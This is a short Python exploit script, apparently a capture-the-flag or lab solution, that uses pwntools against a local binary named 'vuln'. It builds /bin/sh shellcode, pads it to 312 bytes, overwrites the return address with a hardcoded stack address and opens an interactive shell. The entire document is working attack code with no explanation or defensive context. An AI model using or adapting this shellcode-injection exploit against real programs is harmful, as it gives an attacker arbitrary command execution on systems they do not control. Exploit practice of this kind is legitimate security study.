from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())
payload = payload.ljust(312, b'A')
payload += p32(0xffffced0)

log.info(p.clean())

p.sendline(payload)

p.interactive()